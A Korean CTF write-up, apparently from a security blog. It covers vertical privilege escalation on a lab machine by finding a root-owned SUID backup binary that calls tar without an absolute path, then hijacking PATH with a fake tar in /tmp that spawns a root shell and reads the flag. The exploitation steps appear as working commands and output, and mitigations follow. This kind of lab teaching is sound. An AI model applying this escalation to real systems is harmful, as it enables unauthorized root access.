+++
title = "VulnABLE CTF: Root Flag 획득기 (Vertical Privilege Escalation)"
description = "SUID 바이너리 취약점 및 PATH 환경변수 조작을 통한 Root 권한 상승 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "Privilege Escalation", "SUID", "PATH Injection", "Root"]
+++

# VulnABLE CTF: Root Flag 획득 시나리오 (Vertical Privilege Escalation)

드디어 마지막 단계입니다! 우리는 `user1`이라는 일반 계정을 탈취했습니다. 하지만 우리의 최종 목표는 시스템의 모든 권한을 쥐고 있는 신(God)의 권한, 바로 **Root(루트)**가 되는 것입니다.

일반 사용자에서 루트 사용자로 신분 상승을 하는 것을 **수직적 권한 상승(Vertical Privilege Escalation)**이라고 부릅니다. 이번 시나리오에서는 시스템 관리자의 설정 실수를 파고드는 가장 클래식하고도 강력한 기법을 배워보겠습니다.

---

## 🕒 1. 권한 상승 벡터 탐색 (Enumeration)
루트 권한을 얻기 위해 가장 먼저 찾아봐야 할 것은 "내가 임시로 루트 권한을 빌려 쓸 수 있는 파일이 있는가?" 입니다. 리눅스에서는 이를 **SUID(Set Owner User ID)**라고 부릅니다.

### 💡 SUID란 무엇인가요?
리눅스에서 특정 프로그램을 실행할 때, 실행한 사람의 권한이 아니라 **"그 파일을 만든 주인의 권한"**으로 실행되게 해주는 특별한 권한(Permission)입니다. 만약 파일 주인이 `root`이고 SUID가 설정되어 있다면, `user1`이 그 프로그램을 실행하는 순간만큼은 `root`의 권한을 가지게 됩니다.

```bash
# 시스템 전체에서 SUID가 설정된 파일을 검색 (에러 메시지는 /dev/null로 버림)
$ find / -perm -4000 -type f 2>/dev/null
```

**[검색 결과 일부]**
```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
... (기본적인 리눅스 명령어들) ...
/usr/local/bin/sys_backup   <-- 🚨 매우 수상함!
```

**[사고 과정]**
기본 명령어들 사이에 관리자가 직접 만든 것으로 보이는 `/usr/local/bin/sys_backup` 이라는 파일이 있습니다. 이 파일의 상세 권한을 확인해봅니다.

```bash
$ ls -la /usr/local/bin/sys_backup
-rwsr-xr-x 1 root root 16432 Oct 10 15:30 /usr/local/bin/sys_backup
```
권한 부분에 `rws`에서 `s`가 보입니다. 소유자는 `root`입니다. 즉, 이 프로그램을 실행하면 **루트 권한으로 동작**한다는 뜻입니다!

---

## 🕒 2. 취약점 식별 (Vulnerability Identification)
이 프로그램이 대체 무슨 일을 하는지 알아내야 합니다. 파일을 직접 실행해봅니다.

```bash
$ /usr/local/bin/sys_backup
Backing up system logs...
tar: Removing leading `/' from member names
Backup completed successfully!
```

메시지를 보니 내부적으로 `tar` 명령어를 사용해서 시스템 로그를 압축(백업)하는 프로그램인 것 같습니다. 내부가 어떻게 코딩되어 있는지 알아보기 위해 `strings` 명령어(바이너리 파일 안의 사람이 읽을 수 있는 문자열을 추출)를 사용해봅니다.

```bash
$ strings /usr/local/bin/sys_backup
...
Backing up system logs...
tar -czf /var/backups/syslog.tar.gz /var/log/syslog
Backup completed successfully!
...
```

### 🚨 공격 원리: PATH 환경변수 조작 (PATH Variable Injection)
여기서 치명적인 보안 취약점이 발견되었습니다! 
관리자가 코드를 짤 때 `tar` 명령어를 `/bin/tar`처럼 **절대 경로(Absolute Path)**로 쓰지 않고, 그냥 `tar`라는 **상대 경로(Relative Path)**로 작성한 것입니다.

리눅스는 그냥 `tar`라고 입력하면, **환경변수 `$PATH`**에 등록된 디렉터리들을 순서대로 뒤지면서 `tar`라는 실행 파일을 찾습니다. 
그렇다면 만약 우리가 **"가짜 tar"**를 만들고, 환경변수 `$PATH`를 조작해서 시스템이 진짜 `tar`보다 우리의 "가짜 tar"를 먼저 찾게 만들면 어떻게 될까요?
이 프로그램은 SUID로 인해 **루트 권한**으로 실행 중이므로, 우리의 **"가짜 tar"도 루트 권한으로 실행**되어 버립니다!

---

## 🕒 3. 공격 수행 (Exploitation)

### Step 1. 가짜 `tar` 프로그램 만들기
우리가 쓰기 권한을 가지고 있는 `/tmp` 디렉터리로 이동하여 쉘(`/bin/bash`)을 띄워주는 가짜 `tar`를 만듭니다.

```bash
$ cd /tmp
$ echo "/bin/bash" > tar
```

### Step 2. 실행 권한 부여
우리가 만든 가짜 프로그램이 실행될 수 있도록 권한을 줍니다.

```bash
$ chmod +x tar
```

### Step 3. PATH 환경변수 조작
현재 폴더인 `/tmp`를 `$PATH`의 가장 맨 앞(최우선 순위)에 추가합니다.

```bash
$ export PATH=/tmp:$PATH
```
이제 시스템에서 명령어를 실행할 때, 가장 먼저 `/tmp` 디렉터리부터 뒤지게 됩니다.

### Step 4. 트리거 (Trigger)
모든 준비가 끝났습니다. 취약한 SUID 바이너리를 실행합니다!

```bash
$ /usr/local/bin/sys_backup
```

프로그램이 실행되면서 내부적으로 `tar`를 호출합니다. 시스템은 `$PATH`를 따라 가장 먼저 `/tmp`를 확인하고, 우리가 만든 가짜 `tar`(`/bin/bash`)를 찾아냅니다. 그리고 이 프로그램은 **루트(root)** 권한으로 동작 중입니다.

**결과는?!**

```bash
root@vulnable:/tmp# whoami
root
root@vulnable:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1000(user1)
```

마침내 관리자 권한(Root)을 탈취했습니다!! 🎉

---

## 🕒 4. 최종 플래그 획득! 🚩

루트 권한을 얻었으니 가장 깊숙한 곳에 숨겨진 마지막 플래그를 읽을 수 있습니다.

```bash
root@vulnable:/tmp# cat /root/root.txt
# 출력: THM{r00t_pr1v3sc_m4st3r_999}
```

이로써 VulnABLE CTF의 모든 시나리오를 완벽하게 클리어했습니다! 🏆

---

## 🛡️ 방어 대책 (Mitigation)
이러한 치명적인 권한 상승을 막기 위해 개발자와 시스템 관리자가 지켜야 할 철칙입니다:

1. **절대 경로 사용 (Absolute Paths)**: 쉘 스크립트나 C 코드를 작성할 때 외부 명령어를 호출한다면 반드시 `/bin/tar`, `/usr/bin/cat` 처럼 전체 경로를 써야 합니다.
2. **최소 권한의 원칙 (Least Privilege)**: SUID 설정은 극도로 위험합니다. 정말 필요한 바이너리에만 설정해야 하며, 불필요한 스크립트나 프로그램에는 절대로 `chmod +s`를 부여해선 안 됩니다.
3. **환경변수 초기화**: 루트 권한으로 실행되어야 하는 프로그램 내부에서는 시작 시점에 `$PATH`를 안전한 값(`/usr/bin:/bin`)으로 강제 초기화하는 로직을 넣어야 합니다.

축하합니다! 파일 업로드부터 PATH 인젝션까지, 당신은 방금 해커의 사고방식(Hacker's Mindset)을 완벽히 체험하셨습니다. 윤리적 해킹을 위한 당신의 여정을 응원합니다!